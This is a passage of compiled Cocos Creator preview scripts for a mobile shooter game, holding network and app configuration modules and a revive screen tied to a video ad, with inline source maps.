9ydCB7RXhjZWxUYWJsZU5hbWVzLCBMZXZlbENvbmZpZ30gZnJvbSBcIi4uL2NvbmZpZy9FeGNlbFRhYmxlTmFtZXNcIjtcclxuaW1wb3J0IHtFeGNlbENvbmZpZ30gZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9jb25maWcvRXhjZWxDb25maWdcIjtcclxuaW1wb3J0IHtleHR9IGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvZXh0ZW5kL0V4dGVuZFwiO1xyXG5pbXBvcnQge1dvcmxkfSBmcm9tIFwiLi4vaW5mby9Xb3JsZFwiO1xyXG5cclxubGV0IEVORU1ZX0hVUlRfTVVMID0gMTtcclxubGV0IEVORU1ZX0hQX01VTCA9IDE7XHJcbmxldCBFTkVNWV9HT0xEX01VTCA9IDE7XHJcbmxldCBQQVNTX0dPTERfTVVMID0gMTtcclxuXHJcblxyXG5leHBvcnQgY2xhc3MgR2FtZVByb3h5IHtcclxuICAgIHN0YXRpYyBHYW1lU2NlbmU6Y2MuTm9kZSA9IG51bGw7XHJcbiAgICBzdGF0aWMgRXZlbnQgPSB7XHJcbiAgICAgICAgU3RhcnRHZW5FbmVteTpcIlN0YXJ0R2VuRW5lbXlcIixcclxuICAgICAgICBTdG9wR2VuRW5lbXk6XCJTdG9wR2VuRW5lbXlcIixcclxuICAgICAgICBLaWxsRW5lbXk6XCJLaWxsRW5lbXlcIixcclxuICAgICAgICBLaWxsUm9sZTpcIktpbGxSb2xlXCIsXHJcbiAgICAgICAgUGF1c2VHYW1lOlwiUGF1c2VHYW1lXCIsXHJcbiAgICAgICAgU2xvd0dhbWU6XCJTbG93R2FtZVwiLFxyXG4gICAgICAgIEluaXRHYW1lOlwiSW5pdEdhbWVcIixcclxuICAgICAgICBTdGFydEdhbWU6XCJTdGFydEdhbWVcIixcclxuICAgICAgICBSZWxpdmVHYW1lOlwiUmVsaXZlR2FtZVwiLFxyXG4gICAgICAgIE92ZXJHYW1lOlwiT3ZlckdhbWVcIixcclxuICAgICAgICBVcGRhdGVCdWxsZXRDb3VudDpcIlVwZGF0ZUJ1bGxldENvdW50XCIsXHJcbiAgICAgICAgU2hha2VTY3JlZW46XCJTaGFrZVNjcmVlblwiLFxyXG4gICAgICAgIFByb3BDRFplcm86XCJQcm9wQ0RaZXJvXCIsXHJcbiAgICAgICAgUHJvcFRyaWdnZXI6XCJQcm9wVHJpZ2dlclwiLFxyXG4gICAgfTtcclxuXHJcbiAgICBzdGF0aWMgZW1pdChlOnN0cmluZywgLi4uYXJncyl7XHJcbiAgICAgICAgaWYgKHRoaXMuR2FtZVNjZW5lKXtcclxuICAgICAgICAgICAgdGhpcy5HYW1lU2NlbmUuZW1pdChlLCAuLi5hcmdzKTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgc3RhdGljIGZpcnN0QWlkRmxhZyA9IHRydWU7XHJcblxyXG4gICAgc3RhdGljIHNlY29uZEJvc3NOdW0gPSAwO1xyXG5cclxuICAgIC8qKiDlhbPljaEgKi9cclxuICAgIHByaXZhdGUgc3RhdGljIF9sZXZlbCA9IDA7XHJcblxyXG4gICAgc3RhdGljIGdldCBsZXZlbCgpOiBudW1iZXIge1xyXG4gICAgICAgIHJldHVybiB0aGlzLl9sZXZlbDtcclxuICAgIH1cclxuXHJcbiAgICBzdGF0aWMgc2V0IGxldmVsKHZhbHVlOiBudW1iZXIpIHtcclxuICAgICAgICB0aGlzLl9sZXZlbCA9IHZhbHVlO1xyXG4gICAgICAgIGNvbnNvbGUubG9nKFwiX2xldmVsPT09PlwiLCB0aGlzLl9sZXZlbCk7XHJcbiAgICAgICAgbGV0IGdvbGRVcENmZyA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsVGFibGUoRXhjZWxUYWJsZU5hbWVzLkdvbGRVcCk7XHJcbiAgICAgICAgbGV0IGVuZW15VXBDZmcgPSBFeGNlbENvbmZpZy5nZXRFeGNlbFRhYmxlKEV4Y2VsVGFibGVOYW1lcy5FbmVteVVwKTtcclxuICAgICAgICBFTkVNWV9IVVJUX01VTCA9IGVuZW15VXBDZmdbdGhpcy5fbGV2ZWxdWydlbmVteV9odXJ0J107XHJcbiAgICAgICAgRU5FTVlfSFBfTVVMID0gZW5lbXlVcENmZ1t0aGlzLl9sZXZlbF1bJ2VuZW15X2hlYWx0aCddO1xyXG4gICAgICAgIEVORU1ZX0dPTERfTVVMID0gZW5lbXlVcENmZ1t0aGlzLl9sZXZlbF1bJ2VuZW15X2dvbGQnXSAqIGdvbGRVcENmZ1tXb3JsZC5TdG9yYWdlLmdvbGRMdi0xXVsnZ3ZhbHVlJ107XHJcbiAgICAgICAgUEFTU19HT0xEX01VTCA9IGVuZW15VXBDZmdbdGhpcy5fbGV2ZWxdWydjbGVhcl9nb2xkJ107XHJcbiAgICAgICAgbGV0IGxldmVsQ29uZmlnID0gRXhjZWxDb25maWcuZ2V0RXhjZWxUYWJsZShFeGNlbFRhYmxlTmFtZXMuTGV2ZWwpO1xyXG4gICAgICAgIGlmICh0aGlzLl9sZXZlbCA8PSBsZXZlbENvbmZpZy5sZW5ndGggLSA0KXtcclxuICAgICAgICAgICAgdGhpcy5fbGV2ZWxDb25maWcgPSBsZXZlbENvbmZpZ1t0aGlzLl9sZXZlbC0xXTtcclxuICAgICAgICB9ZWxzZSB7XHJcbiAgICAgICAgICAgIC8qKiDmnIDlkI7lm5vlhbPph4zpmo/mnLrkuIDlhbMgKi9cclxuICAgICAgICAgICAgdGhpcy5fbGV2ZWxDb25maWcgPSBsZXZlbENvbmZpZ1tsZXZlbENvbmZpZy5sZW5ndGggLSA0ICsgTWF0aC5jZWlsKE1hdGgucmFuZG9tKCkqMTAwKSU0XTtcclxuICAgICAgICB9XHJcbiAgICAgICAgaWYgKCF0aGlzLl9sZXZlbENvbmZpZyl7XHJcbiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoXCJsZXZlbENvbmZpZyBlcnJvcj09PlwiK3RoaXMuX2xldmVsKTtcclxuICAgICAgICB9XHJcbiAgICAgICAgLyoqIOeUn+aIkOaVjOS6uuWIl+ihqCAqL1xyXG4gICAgICAgIGxldCBlbmVteUFycjEgPSBbXSwgZW5lbXlBcnIyID0gW107XHJcbiAgICAgICAgbGV0IG1heEVuZW15SWQxID0gMCwgbWF4RW5lbXlJZDIgPSAwO1xyXG4gICAgICAgIGxldCBtYXgxID0gMCwgbWF4MiA9IDA7XHJcbiAgICAgICAgbGV0IGVuZW15SUQgPSAxO1xyXG4gICAgICAgIHdoaWxlICh0eXBlb2YgdGhpcy5fbGV2ZWxDb25maWdbYHAxX2VuZW15XyR7ZW5lbXlJRH1gXSAhPT0gXCJ1bmRlZmluZWRcIil7XHJcbiAgICAgICAgICAgIGlmICh0aGlzLl9sZXZlbENvbmZpZ1tgcDFfZW5lbXlfJHtlbmVteUlEfWBdID4gMCl7XHJcbiAgICAgICAgICAgICAgICBmb3IgKGxldCBpPTA7IGk8TWF0aC5mbG9vcih0aGlzLl9sZXZlbENvbmZpZ1tgcDFfZW5lbXlfJHtlbmVteUlEfWBdICogdGhpcy5fbGV2ZWxDb25maWcuYW1vdW50X3AxKTsgaSsrKXtcclxuICAgICAgICAgICAgICAgICAgICBlbmVteUFycjEucHVzaChlbmVteUlEKTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIGlmICh0aGlzLl9sZXZlbENvbmZpZ1tgcDFfZW5lbXlfJHtlbmVteUlEfWBdID4gbWF4MSl7XHJcbiAgICAgICAgICAgICAgICAgICAgbWF4MSA9IHRoaXMuX2xldmVsQ29uZmlnW2BwMV9lbmVteV8ke2VuZW15SUR9YF07XHJcbiAgICAgICAgICAgICAgICAgICAgbWF4RW5lbXlJZDEgPSBlbmVteUlEO1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBpZiAodGhpcy5fbGV2ZWxDb25maWdbYHAyX2VuZW15XyR7ZW5lbXlJRH1gXSA+IDApe1xyXG4gICAgICAgICAgICAgICAgZm9yIChsZXQgaT0wOyBpPE1hdGguZmxvb3IodGhpcy5fbGV2ZWxDb25maWdbYHAyX2VuZW15XyR7ZW5lbXlJRH1gXSAqIHRoaXMuX2xldmVsQ29uZmlnLmFtb3VudF9wMik7IGkrKyl7XHJcbiAgICAgICAgICAgICAgICAgICAgZW5lbXlBcnIyLnB1c2goZW5lbXlJRCk7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBpZiAodGhpcy5fbGV2ZWxDb25maWdbYHAyX2VuZW15XyR7ZW5lbXlJRH1gXSA+IG1heDIpe1xyXG4gICAgICAgICAgICAgICAgICAgIG1heDIgPSB0aGlzLl9sZXZlbENvbmZpZ1tgcDJfZW5lbXlfJHtlbmVteUlEfWBdO1xyXG4gICAgICAgICAgICAgICAgICAgIG1heEVuZW15SWQyID0gZW5lbXlJRDtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICBlbmVteUlEKys7XHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICB0aGlzLl9sZXZlbENvbmZpZy5hbW91bnRfcDEgPSBlbmVteUFycjEubGVuZ3RoO1xyXG4gICAgICAgIHRoaXMuX2xldmVsQ29uZmlnLmFtb3VudF9wMiA9IGVuZW15QXJyMi5sZW5ndGg7XHJcblxyXG4gICAgICAgIC8qKiDmiZPkubHpobrluo8gKi9cclxuICAgICAgICBleHQuc2h1ZmZsZShlbmVteUFycjEpO1xyXG4gICAgICAgIGV4dC5zaHVmZmxlKGVuZW15QXJyMik7XHJcblxyXG4gICAgICAgIC8qKiDlvpfliLDmlYzkurrliJfooaggKi9cclxuICAgICAgICB0aGlzLl9lbmVteUxpc3QubGVuZ3RoID0gMDtcclxuICAgICAgICB0aGlzLl9lbmVteUxpc3QucHVzaCguLi5lbmVteUFycjEpO1xyXG4gICAgICAgIGZvciAobGV0IGk9MDsgaTx0aGlzLl9sZXZlbENvbmZpZy5wMV9ib3NzXzc7IGkrKyl7XHJcbiAgICAgICAgICAgIHRoaXMuX2VuZW15TGlzdC5wdXNoKDcpO1xyXG4gICAgICAgIH1cclxuICAgICAgICBmb3IgKGxldCBpPTA7IGk8dGhpcy5fbGV2ZWxDb25maWcucDFfYm9zc184OyBpKyspe1xyXG4gICAgICAgICAgICB0aGlzLl9lbmVteUxpc3QucHVzaCg4KTtcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIHRoaXMuX2VuZW15TGlzdC5wdXNoKC4uLmVuZW15QXJyMik7XHJcbiAgICAgICAgZm9yIChsZXQgaT0wOyBpPHRoaXMuX2xldmVsQ29uZmlnLnAyX2Jvc3NfNzsgaSsrKXtcclxuICAgICAgICAgICAgdGhpcy5fZW5lbXlMaXN0LnB1c2goNyk7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGZvciAobGV0IGk9MDsgaTx0aGlzLl9sZXZlbENvbmZpZy5wMl9ib3NzXzg7IGkrKyl7XHJcbiAgICAgICAgICAgIHRoaXMuX2VuZW15TGlzdC5wdXNoKDgpO1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgLy/liJ3lp4vljJblsZ7mgKdcclxuICAgICAgICB0aGlzLmlzT3ZlciA9IGZhbHNlO1xyXG4gICAgICAgIHRoaXMua2lsbENvdW50ID0gMDtcclxuICAgICAgICB0aGlzLmdvbGRDb3VudCA9IDA7XHJcbiAgICAgICAgdGhpcy5zZWNvbmRCb3NzTnVtID0gdGhpcy5fbGV2ZWxDb25maWcucDJfYm9zc183ICsgdGhpcy5fbGV2ZWxDb25maWcucDJfYm9zc184O1xyXG4gICAgICAgIHRoaXMuX21heEVuZW15TnVtID0gdGhpcy5fZW5lbXlMaXN0Lmxlbmd0aDtcclxuICAgICAgICB0aGlzLl9zbG93R2FtZSA9IGZhbHNlO1xyXG4gICAgICAgIHRoaXMuX3BhdXNlR2FtZSA9IGZhbHNlO1xyXG4gICAgICAgIHRoaXMubWFnbmV0aWMgPSBmYWxzZTtcclxuICAgIH1cclxuXHJcbiAgICAvKiog5YWz5Y2h6YWN572uICovXHJcbiAgICBwcml2YXRlIHN0YXRpYyBfbGV2ZWxDb25maWc6TGV2ZWxDb25maWcgPSBudWxsO1xyXG5cclxuXHJcbiAgICBzdGF0aWMgZ2V0IGxldmVsQ29uZmlnKCk6IExldmVsQ29uZmlnIHtcclxuICAgICAgICByZXR1cm4gdGhpcy5fbGV2ZWxDb25maWc7XHJcbiAgICB9XHJcblxyXG4gICAgLyoqIOaVjOS6uuWIl+ihqCAqL1xyXG4gICAgcHJpdmF0ZSBzdGF0aWMgX2VuZW15TGlzdDpBcnJheTxudW1iZXI+ID0gW107XHJcblxyXG5cclxuICAgIHN0YXRpYyBnZXQgZW5lbXlMaXN0KCk6IEFycmF5PG51bWJlcj4ge1xyXG4gICAgICAgIHJldHVybiB0aGlzLl9lbmVteUxpc3Q7XHJcbiAgICB9XHJcblxyXG4gICAgLyoqIOmihOmAieaequaUryAqL1xyXG4gICAgc3RhdGljIHByZXBhcmVHdW4gPSAwO1xyXG5cclxuICAgIC8qKiDmmK/lkKbnu5PmnZ8gKi9cclxuICAgIHN0YXRpYyBpc092ZXIgPSBmYWxzZTtcclxuXHJcbiAgICAvKiog5p2A5pWM5pWwICovXHJcbiAgICBzdGF0aWMga2lsbENvdW50ID0gMDtcclxuXHJcbiAgICAvKiog6YeR5biB5pWwICovXHJcbiAgICBzdGF0aWMgZ29sZENvdW50ID0gMDtcclxuXHJcbiAgICAvKiog6YeR5biB55Wq5YCNICovXHJcbiAgICBzdGF0aWMgZ29sZE11bCA9IDE7XHJcblxyXG4gICAgLyoqIOaaguWBnCAqL1xyXG4gICAgcHJpdmF0ZSBzdGF0aWMgX3BhdXNlR2FtZSA9IGZhbHNlO1xyXG5cclxuICAgIC8qKiDno4HlipvpgZPlhbcgKi9cclxuICAgIHN0YXRpYyBtYWduZXRpYyA9IGZhbHNlO1xyXG5cclxuXHJcbiAgICBzdGF0aWMgZ2V0IHBhdXNlR2FtZSgpOiBib29sZWFuIHtcclxuICAgICAgICByZXR1cm4gdGhpcy5fcGF1c2VHYW1lO1xyXG4gICAgfVxyXG5cclxuICAgIHN0YXRpYyBzZXQgcGF1c2VHYW1lKHZhbHVlOiBib29sZWFuKSB7XHJcbiAgICAgICAgY29uc29sZS5sb2coXCJHYW1lUHJveHk9PT0+cGF1c2VHYW1lXCIsIHZhbHVlKTtcclxuICAgICAgICBpZiAodGhpcy5fcGF1c2VHYW1lICE9IHZhbHVlKXtcclxuICAgICAgICAgICAgdGhpcy5fcGF1c2VHYW1lID0gdmFsdWU7XHJcbiAgICAgICAgICAgIHRoaXMuZW1pdCh0aGlzLkV2ZW50LlBhdXNlR2FtZSwgdGhpcy5fcGF1c2VHYW1lKTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgLyoqIOWPmOaFoiAqL1xyXG4gICAgcHJpdmF0ZSBzdGF0aWMgX3Nsb3dHYW1lID0gZmFsc2U7XHJcblxyXG4gICAgc3RhdGljIGdldCBzbG93R2FtZSgpOiBib29sZWFuIHtcclxuICAgICAgICByZXR1cm4gdGhpcy5fc2xvd0dhbWU7XHJcbiAgICB9XHJcblxyXG4gICAgc3RhdGljIHNldCBzbG93R2FtZSh2YWx1ZTogYm9vbGVhbikge1xyXG4gICAgICAgIGlmICh0aGlzLl9zbG93R2FtZSAhPSB2YWx1ZSl7XHJcbiAgICAgICAgICAgIHRoaXMuX3Nsb3dHYW1lID0gdmFsdWU7XHJcbiAgICAgICAgICAgIHRoaXMuZW1pdCh0aGlzLkV2ZW50LlNsb3dHYW1lLCB0aGlzLl9zbG93R2FtZSk7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIC8qKiDmlYzkurrmgLvmlbAgKi9cclxuICAgIHByaXZhdGUgc3RhdGljIF9tYXhFbmVteU51bSA9IDA7XHJcblxyXG4gICAgc3RhdGljIGdldCBtYXhFbmVteU51bSgpOiBudW1iZXIge1xyXG4gICAgICAgIHJldHVybiB0aGlzLl9tYXhFbmVteU51bTtcclxuICAgIH1cclxuXHJcbiAgICAvKiog5pWM5Lq65Lyk5a6z5YWs5byPICovXHJcbiAgICBzdGF0aWMgZW5lbXlIdXJ0TXVsT2YoZW5lbXlJZDpudW1iZXIpe1xyXG4gICAgICAgIHJldHVybiBFTkVNWV9IVVJUX01VTDtcclxuICAgIH1cclxuXHJcbiAgICAvKiog5pWM5Lq66KGA6YeP5YWs5byPICovXHJcbiAgICBzdGF0aWMgZW5lbXlIcE11bE9mKGVuZW15SWQ6bnVtYmVyKXtcclxuICAgICAgICByZXR1cm4gRU5FTVlfSFBfTVVMO1xyXG4gICAgfVxyXG5cclxuICAgIC8qKiDmlYzkurrph5HluIHkuqfph4/lhazlvI8gKi9cclxuICAgIHN0YXRpYyBlbmVteUdvbGRNdWxPZihlbmVteUlkOm51bWJlcil7XHJcbiAgICAgICAgcmV0dXJuIEVORU1ZX0dPTERfTVVMO1xyXG4gICAgfVxyXG5cclxuICAgIC8qKiDov4flhbPph5HluIHlhazlvI8gKi9cclxuICAgIHN0YXRpYyBwYXNzR29sZCgpe1xyXG4gICAgICAgIHJldHVybiBQQVNTX0dPTERfTVVMO1xyXG4gICAgfVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/config/NetworkConfig.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '1cfcd2hmxdBN5+omE1y+zAv', 'NetworkConfig');
// script/app/config/NetworkConfig.ts

Object.defineProperty(exports, "__esModule", { value: true });
exports.NetworkConfig = void 0;
var NetworkConfig = /** @class */ (function () {
    function NetworkConfig() {
    }
    /** 是否连接服务器 */
    NetworkConfig.connectServer = false;
    /** 连接服务器的ip */
    NetworkConfig.host = "https://xddxx.com"; //
    return NetworkConfig;
}());
exports.NetworkConfig = NetworkConfig;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2NvbmZpZy9OZXR3b3JrQ29uZmlnLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7O0FBRUE7SUFBQTtJQU9BLENBQUM7SUFOQSxjQUFjO0lBQ0ssMkJBQWEsR0FBRyxLQUFLLENBQUM7SUFDdEMsZUFBZTtJQUNFLGtCQUFJLEdBQ2pCLG1CQUFtQixDQUFDLENBQUEsRUFBRTtJQUU5QixvQkFBQztDQVBELEFBT0MsSUFBQTtBQVBZLHNDQUFhIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcblxyXG5leHBvcnQgY2xhc3MgTmV0d29ya0NvbmZpZyB7XHJcblx0LyoqIOaYr+WQpui/nuaOpeacjeWKoeWZqCAqL1xyXG4gICAgc3RhdGljIHJlYWRvbmx5IGNvbm5lY3RTZXJ2ZXIgPSBmYWxzZTtcclxuICAgIC8qKiDov57mjqXmnI3liqHlmajnmoRpcCAqL1xyXG4gICAgc3RhdGljIHJlYWRvbmx5ICBob3N0OnN0cmluZyA9XHJcbiAgICAgICAgXCJodHRwczovL3hkZHh4LmNvbVwiOy8vXHJcblxyXG59Il19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/config/AppConfig.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'dd662BFPltNfY7IYdf7FQXJ', 'AppConfig');
// script/app/config/AppConfig.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
exports.AppConfig = void 0;
var AppConfig = /** @class */ (function () {
    function AppConfig() {
    }
    AppConfig.version = "1.0.0";
    AppConfig.gameName = "我是射击手";
    AppConfig.isDebug = true;
    AppConfig.GameID = "2";
    AppConfig.rankKey = "rank2";
    return AppConfig;
}());
exports.AppConfig = AppConfig;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2NvbmZpZy9BcHBDb25maWcudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7O0FBQUEsb0JBQW9CO0FBQ3BCLGlGQUFpRjtBQUNqRix5RkFBeUY7QUFDekYsbUJBQW1CO0FBQ25CLDJGQUEyRjtBQUMzRixtR0FBbUc7QUFDbkcsOEJBQThCO0FBQzlCLDJGQUEyRjtBQUMzRixtR0FBbUc7OztBQUVuRztJQUFBO0lBTUEsQ0FBQztJQUxtQixpQkFBTyxHQUFVLE9BQU8sQ0FBQztJQUN6QixrQkFBUSxHQUFVLE9BQU8sQ0FBQztJQUMxQixpQkFBTyxHQUFXLElBQUksQ0FBQztJQUN2QixnQkFBTSxHQUFVLEdBQUcsQ0FBQztJQUNwQixpQkFBTyxHQUFHLE9BQU8sQ0FBQztJQUN0QyxnQkFBQztDQU5ELEFBTUMsSUFBQTtBQU5ZLDhCQUFTIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiLy8gTGVhcm4gVHlwZVNjcmlwdDpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vIExlYXJuIEF0dHJpYnV0ZTpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV0ZXMuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gTGVhcm4gbGlmZS1jeWNsZSBjYWxsYmFja3M6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL2xpZmUtY3ljbGUtY2FsbGJhY2tzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcblxyXG5leHBvcnQgY2xhc3MgQXBwQ29uZmlnIHtcclxuICAgIHN0YXRpYyByZWFkb25seSB2ZXJzaW9uOnN0cmluZyA9IFwiMS4wLjBcIjtcclxuICAgIHN0YXRpYyByZWFkb25seSBnYW1lTmFtZTpzdHJpbmcgPSBcIuaIkeaYr+WwhOWHu+aJi1wiO1xyXG4gICAgc3RhdGljIHJlYWRvbmx5IGlzRGVidWc6Ym9vbGVhbiA9IHRydWU7XHJcbiAgICBzdGF0aWMgcmVhZG9ubHkgR2FtZUlEOnN0cmluZyA9IFwiMlwiO1xyXG4gICAgc3RhdGljIHJlYWRvbmx5IHJhbmtLZXkgPSBcInJhbmsyXCI7XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/game/GameRelive.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'c841aUcQDlKNb/TIRPN/nS1', 'GameRelive');
// script/app/game/GameRelive.ts

Object.defineProperty(exports, "__esModule", { value: true });
var GameProxy_1 = require("./GameProxy");
var ExcelTableNames_1 = require("../config/ExcelTableNames");
var ExcelConfig_1 = require("../../../framework/config/ExcelConfig");
var World_1 = require("../info/World");
var CDTimer_1 = require("../../../framework/component/CDTimer");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var GameRelive = /** @class */ (function (_super) {
    __extends(GameRelive, _super);
    function GameRelive() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.gameOverNode = null;
        _this.gunSpriteFrames = [];
        _this.gunSprite = null;
        _this.bulletLabel = null;
        _this.cdLabel = null;
        _this.cdTimer = null;
        return _this;
    }
    // LIFE-CYCLE CALLBACKS:
    GameRelive.prototype.onLoad = function () {
        var _this = this;
        cc.game.on("video_7", function () {
            _this.onClickReliveDo();
        }, this);
    };
    GameRelive.prototype.onEnable = function () {
        console.log("GameRelive===>GameProxy.pauseGame = true");
        GameProxy_1.GameProxy.pauseGame = true;
        this.cdTimer.reset();
        this.cdTimer.pause = false;
        this.cdLabel.string = Math.ceil(this.cdTimer.cdDelta()).toString();
        // this.noReliveNode.active = false;
        this.node.stopAllActions();
        // this.node.runAction(cc.sequence(cc.delayTime(3), cc.callFunc(()=>{
        //     this.noReliveNode.active = true;
        // })));
        var weaponConfig = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Weapon).filter(function (value) { return value['id'] != 1; }).sort((function (a, b) { return b['unlock'] - a['unlock']; }));
        for (var _i = 0, weaponConfig_1 = weaponConfig; _i < weaponConfig_1.length; _i++) {
            var item = weaponConfig_1[_i];
            if (GameProxy_1.GameProxy.level >= item['unlock']) {
                this.gunSprite.spriteFrame = this.gunSpriteFrames[item['id'] - 1];
                this.bulletLabel.string = "\u5B50\u5F39 " + World_1.World.My.armory.payloadAddOf(item['id']) * 3 + "x3";
                break;
            }
        }
    };
    GameRelive.prototype.onClickRelive = function (event, data) {
        console.log("【video】7 复活【click】GameRelive Relive");
        World_1.World.Storage._videoSign = 7;
        World_1.World.Storage.videoAd_show();
    };
    GameRelive.prototype.onClickReliveDo = function () {
        this.node.active = false;
        GameProxy_1.GameProxy.pauseGame = false;
        GameProxy_1.GameProxy.emit(GameProxy_1.GameProxy.Event.ReliveGame);
    };
    GameRelive.prototype.onNoRelive = function (event, data) {
        this.node.active = false;
        this.gameOverNode.active = true;
    };
    GameRelive.prototype.onProgressEvent = function (progress) {
        this.cdLabel.string = Math.ceil(this.cdTimer.cdDelta()).toString();
    };
    __decorate([
        property(cc.Node)
    ], GameRelive.prototype, "gameOverNode", void 0);
    __decorate([
        property(cc.SpriteFrame)
    ], GameRelive.prototype, "gunSpriteFrames", void 0);
    __decorate([
        property(cc.Sprite)
    ], GameRelive.prototype, "gunSprite", void 0);
    __decorate([
        property(cc.Label)
    ], GameRelive.prototype, "bulletLabel", void 0);
    __decorate([
        property(cc.Label)
    ], GameRelive.prototype, "cdLabel", void 0);
    __decorate([
        property(CDTimer_1.default)
    ], GameRelive.prototype, "cdTimer", void 0);
    GameRelive = __decorate([
        ccclass
    ], GameRelive);
    return GameRelive;
}(cc.Component));
exports.default = GameRelive;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
